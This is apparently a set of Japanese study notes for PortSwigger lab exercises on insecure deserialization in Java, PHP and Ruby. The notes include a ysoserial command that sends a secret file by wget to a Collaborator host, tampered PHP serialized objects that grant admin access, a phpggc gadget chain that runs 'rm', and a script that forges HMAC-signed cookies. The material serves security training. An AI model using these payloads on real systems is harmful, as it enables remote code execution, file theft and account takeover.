- [[#Java]]
- [[#PHP]]
- [[#Ruby]]

---
## Java

#### 準備
##### エンコーディング方式を明らかにする

###### 自動

- 検出されたシリアライズドオブジェクト / 怪しいCookieに対し、Intruderで選択してScan
- 以下はBase64 -> Gzipの流れでデコードできたということ(💡つまりペイロード生成時にはGzip -> Base64の流れでエンコードする)
![[Pasted image 20240218152128.png]]

###### 手動

1. シリアライズされたオブジェクトをDecoderにペースト -> Smart decode
![[スクリーンショット 2024-02-13 9.45.33.png]]
2. デコードされた文字列の先頭文字を見て、どちらのエンコーディングか明らかにする
	- 16進数 (`xxe`) : `ac ed`
	- Base64(`base64`) : `rO0`

3. エンコーディングの流れを把握する。
	- この場合はURL encoding(赤色) -> Base64 encoding(`rO0`)


#### 悪用する

##### 自動：Java Deserialization Scannerを使用する

- [[Extension：Java Deserialization Scannerの使い方#実行ステップ]]

###### 手動

1. オブジェクトを生成する
```zsh
java -jar ysoserial-all.jar [payload] '[command]' | [base64|xxe]
```
- Payloadは`java -jar ysoserial-all.jar`でリストが表示されるので、ライブラリと対応するものを選択する

- `/home/carlos/secret`窃取
```zsh
java -jar ysoserial-all.jar [payload] 'wget https://COLLABORATOR_DOMAIN --post-file=/home/carlos/secret' | [base64|xxe]
```
- (`-w 0`: base64のオプション。改行を注入しないようにする)

2. 生成されたオブジェクトを、[[#準備]]で明らかにしたエンコーディング方式に合わせて必要であればURLエンコードし(ctrl + U)、元のオブジェクトを上書きしてリクエストする
3. Collaboratorを確認する

---
## PHP

### データ型操作によるアカウント窃取(Stage 2)

 意図されてないデータ型を注入し、phpの"緩い比較"を悪用することでロジックの破壊や意図せぬ挙動をトリガーする

- Inspectorで作業する

1. オブジェクトのusernameをadministratorに変更する
2. `access_token`などのキーで、データ型を`s` -> `i`に変更する
```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"32文字のtoken";}
```
	↓
```php
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```
- ⚠️データ型ラベル(`s`や`b`など）やlengthの変更も忘れない

3. オブジェクトを上書きし、adminパネルにアクセスする(`GET /admin`)

[LAB: Modifying serialized data types](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types)
参考：[[3. シリアライズされたオブジェクトの操作による悪用#phpの緩い比較( ==)]]

---
### アプリケーションの機能を利用する

アプリ特有の機能を利用する

InterceptionとInspectorで作業する

1. InterceptionをONにしてアクションを実行する。リクエストからオブジェクト内部のファイルに対して操作を実行していることを確認する
```php
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"...";s:11:"avatar_link";s:19:"users/wiener/avatar";}
```

2. ファイルを目的のものに変更する。lengthの変更も忘れない
```php
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"...";s:11:"avatar_link";s:19:"/home/carlos/secret";}
```

---
### 任意のオブジェクトを注入する

1. [[🔍 Insecure deserialization#ソースコードや設定ファイルの検査]]で使用できそうなマジックメソッドを発見する
	- `__construct()` → クラスインスタンス化時に呼ばれる
	- `__destruct()` → スクリプト実行終了時に呼び出される
	- `__wakeup()` → オブジェクトデシリアライズ時に呼ばれる`

2. メソッド内で使用されているクラス(e.g.`CustomTemplate`)、興味深い関数(e.g.`unlink`)と使用される引数(e.g.`lock_file_path`)を探す
```php
class CustomTemplate {
...
	function __destruct() {
	        // Carlos thought this would be a good idea
	        if (file_exists($this->lock_file_path)) {
	            unlink($this->lock_file_path);
	        }
	}
}
```

3. シリアライズ化されたオブジェクトをデコードし、構成を把握する。`O`で始まれば悪用可能
```php
O:4:"User":2:{s...}
```

4. ステップ2の引数へ任意の値を渡すオブジェクトを作成する
```php
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

5. 元のオブジェクトを上書きしてリクエスト

---
### PHPGGCを使用する

1. [[🔍 Insecure deserialization#PHP]]で使用されているフレームワークを明らかにする
2. [[🔍 Insecure deserialization#ソースコードや設定ファイルの検査]]でphpinfoを開く
3. シリアライズされたオブジェクトをデコードする
```
{"token":"base64でエンコードされたオブジェクト","sig_hmac_sha1":"f610b165d4601c74b859e31c005bf9db1ebad93a"}
```

4. `hmac`などのハッシュに着目。ハッシュ演算には"secret_key"が必要なので、ステップ2で開いたphpinfoから入手しておく
5. ステップ1で明らかにしたフレームワークに対してphpggcでオブジェクトを生成する方法を[[4.マジックメソッドによる悪用#使用方法基本]]で調査し、オブジェクトを生成する
```zsh
./phpggc symfony/rce4 exec 'rm /home/carlos/morale.txt' | base64
```
- `base64`: ステップ3でわかるように、元がbase64エンコードしているので

6. 出力されたオブジェクトをスクリプトを使って有効な形式に変換する
	- 元々のオブジェクトを含む構造化データの形式(JSON等）に変換する必要がある。
	- 例えば、`{"token":"base64でエンコードされたシリアライズされたオブジェクト", "sig_hmac_sha1":"ハッシュ値"}`の場合、以下のスクリプトを作成する
```php
<?php
$object = "[PHPGGCで生成したオブジェクト]";
$secretKey = "[phpinfoで入手した秘密鍵]";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
```

- これを実行した結果をtxtファイルに出力
```zsh
php script.php > object.txt
```

7. 元々のオブジェクトを上書きしてリクエスト

---
## Ruby

- [[4.マジックメソッドによる悪用#文書化されたガジェットチェーンの利用(without tool)]]